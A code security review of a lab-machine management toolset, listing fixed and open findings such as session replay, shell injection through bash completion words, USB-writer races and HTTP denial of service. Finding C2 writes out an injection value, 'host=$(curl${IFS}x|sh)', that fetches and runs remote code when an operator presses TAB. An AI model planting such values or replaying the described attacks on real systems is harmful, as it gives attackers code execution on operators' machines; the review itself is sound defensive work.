# Code security review (V1, fresh eyes)

Scope: the code as it stands (crates, scripts, web SPA, tracked docs), not the design. The design review is
[design-history/review-security.md](design-history/review-security.md); most of its findings are implemented (openat2 for
the ro key, lock-then-decide block gate, demo keys read-only on hardware, v1 hints off by default, penalty box kept off
established sessions). This review looked for what the code still gets wrong. Every item says whether it was **FIXED**
in this pass (small, safe, tested) or is **OPEN** (needs an owner decision or a larger change).

Threat model: as in SECURITY.md. An attacker on the segment can sniff, spoof, inject, replay and flood and holds no key,
unless an item says "ro holder" (the ro key is meant to be shared).

## Fixed in this pass

### C1 (HIGH, FIXED) Replay of a captured HELLO/OPEN after the session ended re-ran its requests

`labproto::session::ServerSessions::on_open` accepted any OPEN whose cookie (`sn`) was still valid (15 to 30 s) and whose
tag verified. Nothing remembered that the cookie had already started a session. A passive attacker who captured a short
session (`i7labctl --ether MAC --cmd reboot`, an `exec`, a `put`, a `blk.write --destructive --serial S`) could, once that
session ended (CLOSE, idle, eviction), replay the OPEN from the client's MAC: the host opened a NEW session with the same
SK and a fresh replay window, and the captured REQ frames then verified and ran a second time.

Fix: `ServerSessions` keeps the `sn` of every OPEN that started a session for `SPENT_TTL` (2 cookie buckets + 1 s); a second
OPEN with a spent `sn` is dropped (counted in `stats.replays`). A retransmitted OPEN for the still-live session keeps
working (it is answered from the existing session before this check). Only verified OPENs enter the list, so a keyless
attacker cannot fill it; at `SPENT_CAP` (4096) new OPENs are refused (fail closed) until entries age out.
Test: `labproto/tests/session_attacks.rs::replayed_open_after_the_session_ended_cannot_rerun_its_requests`. It fails with
the check disabled (verified), passes with it.

### C2 (HIGH, FIXED) Shell code execution in the operator's shell through completion words from L2 beacons

`i7labctl completions bash` emits `compgen -W "... $(i7labctl __hosts)"`. bash expands `$(..)`, backquotes and `${..}`
inside the `-W` word list (checked: `compgen -W '$(echo X >&2)'` runs `echo`). `__hosts` printed registry hostnames and
board serials that come from beacons, which are accepted even with an unverified tag. A neighbour broadcasting a beacon with
`host=$(curl${IFS}x|sh)` got code run as the operator on their next TAB.

Fix: `cmds::completion_safe` admits only `[A-Za-z0-9._:-]`, at most 128 bytes; `__hosts` prints only such words (aliases
too). Test `cmds::tests::completion_words_are_inert`.

### C3 (MEDIUM, FIXED) `build-usb-drive` could miss a mounted disk, and wrote whatever disk had the name after the prompt

* `MNT="$(lsblk -nro MOUNTPOINTS ... | grep . | ... || true)"`: `MOUNTPOINTS` needs util-linux 2.37+. On older lsblk it
  fails, `|| true` swallows it, and "nothing is mounted" passed. Now `lsblk -nro MOUNTPOINT` (every version), and a failing
  lsblk refuses.
* Between the checks and `wipefs`/`dd` the script waits for the typed device name. A stick pulled and another disk plugged
  in (same `/dev/sdX`) was written without any re-check. Now the identity (`dev` major:minor, `diskseq`, serial, size) is
  recorded after the checks and compared again, plus a fresh mount check, immediately before `wipefs`. `wipefs` runs without
  `--force`, so a disk in use still stops the script under `set -e`.

### C4 (MEDIUM, FIXED) ro key: `/proc/kmsg` and PCI BAR files were readable

`get /proc/kmsg` consumes kernel log records (other readers lose them) and blocks; `get /sys/bus/pci/devices/*/resourceN`
is a `read(2)` of device I/O BARs with possible side effects. `registry::PROC_DENY` gains `kmsg`; `path_policy` denies any
`/sys` component `resource<digit>...` for the ro role (`resource`, the text file, stays readable). Table test extended.

### C5 (LOW, FIXED) Key set edge cases

* `Key::is_demo` only compared against the demo key of the file's own role: `i7k1:admin:<demo ro bytes>` was not detected
  as public. Now either demo key counts.
* `KeySet::load_dir` accepted `admin.key` and `ro.key` with the same bytes; `by_id` finds admin first, so every ro holder
  would be admin. Now refused. Tests `keys::tests::demo_detection`, `identical_admin_and_ro_refused`.

### C6 (LOW, FIXED) `scripts/remote --clean` label

`-l LABEL` went straight into `rm -rf '/tmp/i7ll-$LABEL'` on the build host. Labels are now `[A-Za-z0-9_][A-Za-z0-9._-]*`
without `..`.

### C7 (PUBLIC RELEASE, FIXED) Internal host names, lab addresses, user paths, real identifiers in tracked files

* `scripts/lib/common.sh` and `scripts/remote` defaulted to the internal build host FQDN. Now: `$I7LL_HOST`, else the first
  line of `~/.config/i7lablinux/build-host` (outside the repo), else a clear error (`need_build_host`). On the operator
  machine this file was created with the previous default, so existing workflows keep working.
* The internal build host and operator machine names, lab subnet addresses (in help examples, help goldens, TUI sample data
  and goldens, beacon/discover tests, docs), `/home/<user>` paths and a real-looking MAC and board serial from the prior art
  were replaced with neutral text, RFC 5737 addresses (192.0.2.x, same string length so the goldens keep their columns) and
  a locally administered MAC (02:00:00:9d:01:57). `cargo test --workspace` passes after the change.
* `.gitignore` also ignores `*.key`, `keys.cpio`, `KEYSET-ID`, `*_ed25519[.pub]` anywhere in the tree.
* Checked and clean: no `BEGIN ... PRIVATE KEY`, no `i7k1:` key lines with hex, no tokens or passwords in tracked files;
  `keys/`, `out/`, `target/` are ignored (`git status --ignored`); the labprobe fixtures have every serial, WWID, UUID and
  MAC scrubbed.

## Open (not changed here)

### O1 (MEDIUM) The SPA is served unauthenticated over plain HTTP and the operator pastes the admin key into it

`GET /` is open by design and there is no TLS. Anyone on path (or spoofing the host's IP) can serve a modified page and read
the key line typed into it (sessionStorage does not help). Recommendation: say in WEB.md/SECURITY.md that the web UI is for
trusted segments only and prefer the ro key there; longer term ship the SPA inside `i7labctl` (`i7labctl web HOST` serves it
on localhost and proxies signed requests), so the key never enters a page served by the device.

### O2 (MEDIUM) Demo keys give public remote root inside any VM

`KeyPolicy` grants full admin to demo keys whenever DMI says QEMU or the CPU has the `hypervisor` flag. A demo image booted
in a VM bridged onto a real LAN is remote root for anyone. Recommendation: additionally require an explicit kernel flag
(`i7lab.demo_admin=1`, set only by `scripts/qemu-test`/`e2e`).

### O3 (MEDIUM) HTTP: slow clients can hold every worker

`MAX_WORKERS = 16`, `READ_TIMEOUT = 10 s` per read, not per request. 16 connections that send one header byte every 9 s
keep the API unavailable (unauthenticated). Recommendation: a total deadline for the request head (e.g. 10 s), and a per-IP
connection cap (e.g. 4).

### O4 (LOW/MEDIUM) HTTP nonce store eviction

`GET /api/v1/nonce` is open and the store keeps 256 nonces, oldest evicted. A flood evicts a real client's nonce between
fetch and use (401 "nonce unknown"); i7labctl retries, the SPA shows an error. Recommendation: per-IP issue rate limit and
evict by issuer before evicting others.

### O5 (LOW/MEDIUM) ro holders can evict admin sessions

`MAX_SESSIONS = 8`, the oldest is evicted for a new verified OPEN of any role, and per-MAC caps are keyed on a spoofable
MAC. A ro key holder can therefore close admin sessions repeatedly. Recommendation: never evict an admin session to make
room for a ro one (refuse with BUSY instead).

### O6 (LOW) ro can read what admins ran

`logs --audit`, `/run/i7lab/audit.log` and `/proc/<pid>/cmdline` are ro-readable and show admin argv (including `--env
K=V`). Intended for transparency; document "do not pass secrets in argv". The audit log on tmpfs is unbounded (admin
traffic only); a size cap with rotation would be cheap.

### O7 (LOW) ro `get` of a FIFO or a blocking sysfs/proc file

`get` opens and reads without a budget; a FIFO under `/run/i7lab` or a blocking attribute ties up a handler until the
client cancels. Recommendation: refuse non-regular files for ro except under `/proc` and `/sys`, and read those with the
labprobe budget.

### O8 (LOW) Boot media identity on ISO boot

With `i7lab.boot=iso` there is no PARTUUID, so nothing is marked `boot_media`. In CD mode the medium is read-only (refused
as `read_only`); if the ISO is attached as a writable USB disk (virtual media "disk" mode) it is only protected by the
partition-table/signature override rule. Recommendation: on ISO boot also mark the device carrying the ISO9660 volume with
the image's volume id as boot media. Separately, all sticks written from one image share one PARTUUID, so a second
i7lablinux stick in the same host is also (safely) refused as boot media; document it.

### O9 (LOW) `build-usb-drive` policy choices

Interactive mode needs only the typed device name, not the serial; a removable USB disk up to 2.2 TB with filesystems on it
(an external backup SSD) passes after the confirmation. Suggest requiring `--serial` whenever the target is not blank
(any partition table or signature), mirroring the in-image gate. `--internal` intentionally allows unmounted internal disks.

### O10 (LOW) Key lookup in the current directory

`i7labctl` falls back to `./keys/<role>.key`. Running it inside someone else's checkout uses their key (a wrong key,
not a leak, but `discover` then marks the operator's hosts `other-keyset`). Consider dropping the cwd fallback or warning.

### O11 (PUBLIC RELEASE) Text that still reads as internal

* `docs/design-history/*` records the internal process: lane names, bulletin board topic numbers, internal branch names,
  the private prior-art repo name. Prune or summarise before publishing.
* The earlier prototype is referred to in source comments (`labproto/src/{json,text,crypto,sys,packet}.rs`,
  `i7labd/src/dhcp.rs`). Harmless, but a public reader cannot follow those references.
* `m900` (an internal host nickname) is used as the example host in help text, help goldens and docs.
* `docs/BRIEF-CHECKLIST.md` was being written during this review and still names the internal build host; scrub it when
  its author is done.

### O12 (INFO) unsafe blocks

Read in full: `labproto/src/packet.rs` (socket, BPF, recvmsg/cmsg walk), `labprobe/src/net.rs` (SIOCETHTOOL ifreq: 40
bytes, name bounded to 15), the `pre_exec` closures in `i7labd` (setsid/TIOCSCTTY only). Each has a SAFETY note and checks
lengths. The other FFI modules (`i7lab-init/src/ffi.rs`, `labproto/src/sys.rs`, `i7labd/src/ffi.rs`, `labtui` term/event,
`i7labsh/src/ffi.rs`) were skimmed, not proven.

## Checked and fine

* HTTP auth: key id selects the key, the nonce is consumed before the MAC check, the MAC covers method, full target and the
  body hash; raw uploads are authenticated on the declared digest before any byte is read and the bytes are then checked
  against it; responses and stream events carry proofs; failures are delayed and counted per IP.
* Command execution: `exec` uses argv (no shell), `exec`/`shell`/`put`/`fs.rm`/`blk.write` are admin-only, the role check
  and path policy run in one place (`Registry::dispatch`), and the path is the first argv word rewritten to its normal form.
* Path traversal: lexical normalisation rejects `.`/`..`, ro opens with `openat2(RESOLVE_BENEATH|RESOLVE_NO_MAGICLINKS)`
  from the allow-listed root, `/etc/i7lab/keys` is refused for every role on the opened fd's real path.
* Block write gate: O_EXCL claim first, every fact re-read from the locked fd, rdev of `/dev/<name>` checked against sysfs,
  serial or WWID required, mounted/held/swap/boot/read-only are absolute; `blk.read`/`blk.verify` never return disk bytes.
* Terminal output of host-supplied strings goes through `labproto::text::sanitize`; the SPA builds DOM with text nodes only
  and runs under a nonce CSP.
